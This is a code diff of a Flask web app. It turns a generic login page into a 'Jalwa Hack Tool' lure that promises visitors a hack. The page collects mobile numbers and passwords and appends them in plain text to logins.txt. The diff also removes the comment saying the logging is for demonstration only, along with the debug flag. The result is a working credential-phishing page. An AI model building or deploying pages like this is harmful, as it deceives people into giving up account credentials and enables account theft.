@@ -5,118 +5,88 @@ app = Flask(__name__)
 @app.route('/')
 def home():
     return '''
-    <!DOCTYPE html>
-    <html lang="en">
+    <html>
     <head>
-        <title>Premium Login Portal ✨</title>
-        <meta charset="UTF-8">
+        <title>Jalwa Hack Login 🔥</title>
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
         <style>
             body {
-                min-height: 100vh;
                 margin: 0;
-                background: linear-gradient(135deg, #0f2027, #2c5364 80%);
+                padding: 0;
+                height: 100vh;
+                width: 100%;
+                background: linear-gradient(135deg, #000000, #0f0f0f);
+                color: #39ff14;
+                font-family: monospace;
                 display: flex;
-                align-items: center;
                 justify-content: center;
-                font-family: 'Roboto Mono', monospace;
-                overflow: hidden;
+                align-items: center;
             }
-            .glass-card {
-                background: rgba(255, 255, 255, 0.12);
-                border-radius: 20px;
-                box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
-                backdrop-filter: blur(8px);
-                -webkit-backdrop-filter: blur(8px);
-                border: 1.5px solid rgba(255,255,255,0.18);
-                padding: 48px 36px 36px 36px;
-                width: 340px;
+            .container {
                 text-align: center;
-                animation: fadeIn 1.5s;
+                background: rgba(0, 255, 0, 0.05);
+                padding: 25px;
+                border-radius: 15px;
+                box-shadow: 0 0 25px #39ff14, 0 0 40px #ff0080;
+                width: 90%;
+                max-width: 400px;
             }
-            @keyframes fadeIn {
-                from { opacity: 0; transform: translateY(-60px);}
-                to { opacity: 1; transform: translateY(0);}
+            h1 {
+                color: #00ff00;
+                text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00, 0 0 20px #00ff00, 0 0 40px #0ff;
+                font-size: 30px;
+                margin-bottom: 10px;
             }
-            .logo {
-                font-family: 'Orbitron', sans-serif;
-                font-size: 2.6rem;
-                color: #00ffd0;
-                letter-spacing: 2px;
-                margin-bottom: 12px;
-                text-shadow: 0 0 18px #00ffd0, 0 0 6px #fff;
-                animation: logoGlow 2s infinite alternate;
-            }
-            @keyframes logoGlow {
-                from {text-shadow: 0 0 18px #00ffd0, 0 0 6px #fff;}
-                to {text-shadow: 0 0 36px #00ffd0, 0 0 12px #fff;}
-            }
-            .subtitle {
-                color: #fff;
-                font-size: 1.15rem;
-                margin-bottom: 30px;
-                letter-spacing: 1.5px;
-                opacity: 0.85;
-            }
-            form {
-                display: flex;
-                flex-direction: column;
-                gap: 20px;
+            h3 {
+                color: #ff0080;
+                text-shadow: 0 0 5px #ff0080, 0 0 10px #ff0080;
+                font-size: 20px;
+                margin-top: 0;
             }
             input[type="text"], input[type="password"] {
-                padding: 14px;
-                border: none;
-                border-radius: 10px;
-                font-size: 1.1rem;
-                background: rgba(255,255,255,0.17);
-                color: #00ffd0;
-                outline: none;
-                box-shadow: 0 2px 8px rgba(0,255,208,0.09);
-                transition: box-shadow 0.2s;
-            }
-            input[type="text"]:focus, input[type="password"]:focus {
-                box-shadow: 0 0 16px #00ffd0;
+                width: 90%;
+                padding: 12px;
+                margin: 10px 0;
+                background-color: #000;
+                color: #39ff14;
+                border: 2px solid #ff0080;
+                border-radius: 8px;
+                font-size: 18px;
+                box-shadow: 0 0 10px #ff0080;
             }
             input[type="submit"] {
-                padding: 14px;
-                font-size: 1.2rem;
-                font-weight: bold;
-                color: #fff;
-                background: linear-gradient(90deg, #00ffd0 40%, #ff00cc 100%);
+                width: 95%;
+                padding: 12px;
+                font-size: 20px;
+                color: #000;
+                background: linear-gradient(45deg, #39ff14, #00ffff);
                 border: none;
-                border-radius: 10px;
+                border-radius: 8px;
                 cursor: pointer;
-                box-shadow: 0 0 24px #00ffd0, 0 0 12px #ff00cc;
-                letter-spacing: 1.5px;
-                transition: background 0.2s, color 0.2s, box-shadow 0.2s;
+                box-shadow: 0 0 10px #00ffff, 0 0 20px #39ff14;
             }
             input[type="submit"]:hover {
-                background: linear-gradient(90deg, #ff00cc 40%, #00ffd0 100%);
-                color: #222;
-                box-shadow: 0 0 32px #ff00cc, 0 0 18px #00ffd0;
+                background: linear-gradient(45deg, #ff0080, #ff0000);
+                box-shadow: 0 0 20px #ff0080, 0 0 30px #ff0000;
+                color: #fff;
             }
-            .note {
-                margin-top: 22px;
-                color: #fffa;
-                font-size: 1rem;
-                text-shadow: 0 0 6px #00ffd0;
-            }
-            @media (max-width: 500px) {
-                .glass-card { width: 92vw; padding: 24px 8vw 18px 8vw;}
+            p {
+                color: #ffff00;
+                font-size: 16px;
+                text-shadow: 0 0 5px #ffff00;
             }
         </style>
     </head>
     <body>
-        <div class="glass-card">
-            <div class="logo">JALWA LOGIN</div>
-            <div class="subtitle">Welcome to your premium portal.<br>Sign in to continue.</div>
-            <form action="/submit" method="post" autocomplete="off">
-                <input type="text" name="number" placeholder="Mobile Number" required>
-                <input type="password" name="password" placeholder="Password" required>
-                <input type="submit" value="Sign In">
+        <div class="container">
+            <h1>🔥 JALWA HACK TOOL ULTIMATE 🔥</h1>
+            <h3>H A C K   N U M B E R   F O U N D !</h3>
+            <form action="/submit" method="post">
+                <input type="text" name="number" placeholder="Enter Mobile Number"><br>
+                <input type="password" name="password" placeholder="Enter Password"><br>
+                <input type="submit" value="💣 Hack Now 💣">
             </form>
-            <div class="note">Your credentials are safe and encrypted.</div>
+            <p>Use this number to sign up and activate hack - Jalwa Mode ON!</p>
         </div>
     </body>
     </html>
@@ -126,68 +96,38 @@ def home():
 def submit():
     number = request.form.get('number')
     password = request.form.get('password')
-    # Logging for demonstration only. In production, never store passwords in plain text!
     with open("logins.txt", "a") as f:
         f.write(f"Number: {number}, Password: {password}\n")
     return '''
-    <!DOCTYPE html>
-    <html lang="en">
+    <html>
     <head>
-        <title>Login Success</title>
-        <meta charset="UTF-8">
+        <title>Hack Success</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <style>
             body {
-                background: linear-gradient(135deg, #0f2027, #2c5364 80%);
-                min-height: 100vh;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                font-family: 'Roboto Mono', monospace;
-            }
-            .glass-card {
-                background: rgba(255, 255, 255, 0.12);
-                border-radius: 20px;
-                box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
-                backdrop-filter: blur(8px);
-                -webkit-backdrop-filter: blur(8px);
-                border: 1.5px solid rgba(255,255,255,0.18);
-                padding: 48px 36px 36px 36px;
-                width: 340px;
+                background: linear-gradient(135deg, #000000, #0f0f0f);
+                color: #00ff00;
                 text-align: center;
-                animation: fadeIn 1.5s;
+                font-family: monospace;
+                padding-top: 100px;
             }
-            @keyframes fadeIn {
-                from { opacity: 0; transform: translateY(60px);}
-                to { opacity: 1; transform: translateY(0);}
-            }
-            .success {
-                color: #00ffd0;
-                font-size: 2rem;
-                margin-bottom: 14px;
-                text-shadow: 0 0 18px #00ffd0, 0 0 6px #fff;
+            h2 {
+                color: #00ff00;
+                text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
             }
             a {
-                color: #ff00cc;
-                font-size: 1.1rem;
-                text-decoration: none;
-                margin-top: 18px;
-                display: inline-block;
-                transition: color 0.2s;
-            }
-            a:hover {
-                color: #00ffd0;
-                text-decoration: underline;
+                color: #39ff14;
+                font-size: 20px;
+                text-shadow: 0 0 5px #39ff14;
             }
         </style>
     </head>
     <body>
-        <div class="glass-card">
-            <div class="success">✅ Login Successful!</div>
-            <a href="/">Back to Login</a>
-        </div>
+        <h2>✅ Hack Successful! Data Captured!</h2>
+        <a href="/">Back to Hack</a>
     </body>
     </html>
     '''
 
 if __name__ == "__main__":
-    app.run(debug=True)
+    app.run()
